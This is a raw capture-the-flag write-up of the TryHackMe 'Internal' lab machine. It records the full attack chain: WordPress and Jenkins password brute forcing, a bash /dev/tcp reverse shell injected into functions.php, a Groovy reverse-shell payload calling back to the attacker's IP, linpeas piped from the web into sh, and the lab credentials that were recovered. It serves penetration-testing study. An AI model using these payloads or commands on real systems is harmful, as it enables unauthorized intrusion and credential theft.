# Internal [TryHackMe]

<sub>_This is a raw write-up. I write these to document important things for myself to use later if I need it. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.84.237
```

Let's perform an `nmap` scan and check for open ports:

```
nmap -A -Pn $targ3t -oN nmap.scan
```

Seems like there's only `22/tcp` and `80/tcp` open and operational. I'll launch a complete scan, just in case:

```
nmap -p- $target -oN nmap.full.scan -vv
```

This is supposed to iterate every single port and confirm if its status.

No more open ports, I'll run another scan for vulnerabilities, on these two ports specifically:

```
nmap --script vuln -p 22,80 $targ3t -oN nmap.vuln.scan -vv
```

Only `http-enum` script for port `80` applied and found several paths:

```
| http-enum:
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
```

It clearly has a `/blog/wp-login.php`, although `http-wordpress-users` script returned an error:

```
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
```

I guess I can use a `wpscan` to see if there are any further vulnerabilities concerning wordpress specifically:

```
wpscan -e -t 10 --detection-mode aggressive --plugins-detection aggressive --plugins-version-detection aggressive --url $targ3t/blog -o wp.scan -v
```

And I'll also launch a similar one for `$targ3t/wordpress`:

```
wpscan -e -t 10 --detection-mode aggressive --plugins-detection aggressive --plugins-version-detection aggressive --url $targ3t/wordpress -o wp1.scan -v
```

Both scans delivered interesting results. For `/blog` path we get and `xml-rpc` vulnerability and several reference to metasploit modules, as well as an `admin` user's existence through brute-force. Much of the same (except for `admin`) was found on the `/wordpress` path. Both paths have a `readme.html` file accessible.

Now that we have to browse the site, let's add a recommended line to the `/etc/hosts` for this machine:

```
10.10.84.237    internal.thm
```

Now let's go to each `readme.html` file:

```
firefox internal.thm/blog/readme.html
firefox internal.thm/wordpress/readme.html
```

Both files are identical and although they don't link to any vulnerable places, it seems like we shouldn't be seeing this at all. Let's continue with our enumeration:

```
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

Some paths are accessible but besides the ones we already had discovered, none particularly stand out. To get back to `xml-rpc` vulnerability discovered by `wpscan`, let's see if we can use this scanner: `auxiliary/scanner/http/wordpress_xmlrpc_login`:

```
msfconsole -q -x "use auxiliary/scanner/http/wordpress_xmlrpc_login; set RHOSTS 10.10.84.237; set TARGETURI /blog; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

And it found a password: 

```
[+] 10.10.84.237:80 - Success: 'admin:my2boys' 
```

And going to:

```
firefox internal.thm/blog/wp-login
```

Opens up an admin interface for this user. Manually enumerating the admin panel tells me it won't let me upload a php file for security reasons and it doesn't let me upload images either, due to an error about writing files to server's indicated directory. Theme editor lets us customize front end along with `functions.php`. I'll give a small edit to this file. I'll add the following line before all of the code:

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.100.243/9876 0>&1'"); __halt_compiler();
```

Start a `netcat` listener on my machine:

```
nc -lvnp 9876
```

And save this edit and go to `internal.thm/blog`

And we have a `www-data` shell! We can't visit any home directories with it though. Let's see if we have any privileged binaries:

```
find / -perm /4000 2>/dev/null
```

We can't use sudo, so these aren't very useful to us. Let's try linpeas this time:

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

I looked through each red string, tried everything, but nothing is worthwhile or working.

<sup>_Assisted by [write-up](https://medium.com/swlh/tryhackme-internal-walkthrough-fdc6c4b569bd):_</sup> I guess we have to run these general commands too from time to time:

```
python -c "import pty; pty.spawn('/bin/bash')"
cd /
find / -type f -name *.txt 2>/dev/null
```

The very first result is `/opt/wp-save.txt`

```
cat /opt/wp-save.txt
```

This returns the user:password pair of one of the users on this machine:

```
ssh aubreanna@internal.thm
```

We're in. There's a `user.txt` file in the home directory:

```
cat user.txt
```

There goes our first flag. There's another file in the directory:

```
cat jenkins.txt
```

It says some `internal Jenkins service is running on 172.17.0.2:8080` Which means it is running as localhost on this server, and only accessible to this server. Let's use SSH tunneling to circumvent this:

```
ssh -L 9876:172.17.0.2:8080 aubreanna@internal.thm
```

Now we need to visit this tunnelled Jenkins service on our local machine:

```
firefox localhost:9876
```

And there it is, the login form. Let's try to brute force it:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9876 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid' -V
```

The password for `admin` appears to be `__spongebob__`. Now let's log in.

This part is more or less straightforward, we need to go to a __Script Console__ and inject a reverse shell script in Groovy. In this case I just borrowed one from [PayloadsAllThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#groovy):

```
String host="10.11.100.243";
int port=4443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And start a reverse shell on our host machine:

```
nc -lvnp 4443
```

And when we hit run at the script console, we get the shell back in netcat. 

Now let's hit the same search command we used previously to get `aubreanna` credentials:

```
find / -type f -name *.txt 2>/dev/null
```

The very first result is `/opt/note.txt`, which discloses `root` password:

```
root:tr0ub13guM!@#123
```

Let's use it to ssh into it:

```
ssh root@internal.thm
```

And once we're in:

```
cat /root/root.txt
```

There goes our root flag!
